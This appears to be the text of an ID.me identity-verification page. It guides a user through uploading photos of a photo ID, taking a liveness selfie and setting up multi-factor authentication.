Complete Your Secure Setup

Welcome to ID.me's simplified verification assistant. Please follow these three essential steps to secure your identity and access connected government, state, or healthcare services.

Key Benefits of ID.me:

  • Trusted Security: Certified NIST 800-63-3 Digital Identity compliant.
  • Single Login: One verified identity for hundreds of organizations.
  • Privacy First: You control when and how your data is shared.

Step 1: Upload Your Identity Document

  1. Have your valid photo ID ready (e.g., Driver's License or Passport).
  2. Submit a high-quality, color photo of the **front** of your ID.
  3. Submit a high-quality, color photo of the **back** of your ID (if applicable).

Step 2: Take a Selfie for Liveness

  1. Ensure you are in a well-lit area.
  2. Follow the on-screen prompts to capture a live, portrait selfie.
  3. Your selfie will be compared securely against the photo on your ID document.

Success Tips:

  • Look directly at the camera.
  • Keep your face plain (no smiling, no hats, no sunglasses).

Step 3: Secure Your Account (MFA)

  1. Set up Multi-Factor Authentication (MFA) to prevent unauthorized access.
  2. Choose your method: Push Notification (App), SMS Code, or Code Generator.
  3. Confirm your MFA setup to complete the verification process.
Zero Trust Security:

MFA is mandatory. Even if someone steals your password, they cannot access your account without your secondary device. Your data remains protected.

Action Required: Please complete all steps sequentially. Do not close this window until you receive a "Verification Complete" confirmation.
